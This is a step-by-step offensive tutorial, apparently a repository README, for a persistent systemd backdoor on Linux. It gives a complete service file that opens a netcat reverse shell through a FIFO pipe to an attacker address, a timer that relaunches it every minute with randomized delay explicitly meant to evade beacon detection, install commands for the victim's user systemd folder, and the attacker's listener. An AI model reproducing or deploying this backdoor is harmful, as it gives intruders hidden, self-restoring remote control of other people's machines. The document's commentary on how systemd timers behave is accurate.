# Scheduled Reverse Shell

## Description

This sequence of commands sets up a scheduled task, much like the better-known `cron` jobs, to execute
a reverse shell using a FIFO pipe located at `/tmp/backpipe`.

The service file (`revshell.service`) uses:

* The `Environment` directive to set up the remote host and port to connect to
* The `ExecStartPre` directive to check fo the FIFO pipe and create it if it does not exist
* The `ExecStart` directive to execute the backdoor sequence (more info on how it works located in the linked blog below)

The timer file (`revshell.timer`) uses:

* The `AccuracySec` directive to align service execution with the wider system
* The `OnCalendar` directive to execute the specified unit at the start of every minute
* The `Unit` directive to identify the unit file to execute when the timer is triggered
* The `RandomizedDelaySec` to avoid simple beacon detections
* The `Persistent` directive to reactivate this timer immediately if it missed previous activations

## Additional Notes

* The reverse shell service does not end when the shell drops; systemd still considers the service "activated"
  after the main (`ExecStart`) process dies
* The `.timer` file ensures the backdoor gets re-run if the shell drops
* systemd only runs the next scheduled task if the previous task has ended
  * Avoids unnecessary logs
* Tasks will automatically run again if the backdoor ends after the next task was supposed to run
  * systemd will not wait until the timer gets scheduled again
  * e.g. 4.5 minutes after initial run on a per-minute timer

    ```txt
    [1]       [2]        [3]        [4]          [5]
    run-------skip-------skip-------skip-die-run-skip
    ```

* The `.timer` file will randomize unit execution a bit based on the `AccuracySec` and `RandomizedDelaySec` directives
  * `AccuracySec` is a measure of how accurate systemd must be when executing the associated unit.
    This is done so systemd can attempt to reduce executions that fall within the same time window.
  * `RandomizedDelaySec` randomizes the exact second at which systemd will execute the unit.
    This is done so systemd can minimize the chance many units fire at once and possibly consume too many resources.
    It's also really nice for avoiding beacon detections :)
  * The timer below will first choose a time within the `RandomizedDelaySec`, and then look for a time within `AccuracySec`
    * In reality, this unit will execute sometime between `*:56 - *:05` seconds

## Step by Step

1. Stand up listener on attacker server

```sh
$ nc -nlvp 4444
listening on [any] 4444 ...
```

2. Generate a service file to create the backdoor on the victim

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=A simple reverse shell
Documentation=https://github.com/infosec-intern/sneaky-systemd-shit

[Service]
; https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
Type=simple
Environment=RHOST="10.10.10.10" RPORT="4444"
ExecStartPre=/bin/sh -c "find /tmp/backpipe || mknod --mode=0666 /tmp/backpipe p"
ExecStart=/bin/sh -c "/bin/sh 0</tmp/backpipe | /bin/nc ${RHOST} ${RPORT} 1>/tmp/backpipe"
```

3. Generate a timer file to execute the backdoor at regular intervals (every minute in our case)

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.timer.html
[Timer]
AccuracySec=1s
OnCalendar=*-*-* *:*:00
Unit=revshell.service
RandomizedDelaySec=4s
Persistent=true
```

4. Install into the systemd user folder on the victim and reload the units

```sh
$ mkdir -p ~/.config/systemd/user/
$ ln -s `pwd`/revshell.service ~/.config/systemd/user/
$ ln -s `pwd`/revshell.timer ~/.config/systemd/user/
$ systemctl --user daemon-reload
```

5. Start the scheduled task

```sh
$ systemctl --user start revshell.timer
```

6. Wait for the shell!

```sh
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [${attacker}] from (UNKNOWN) [${victim}]
```
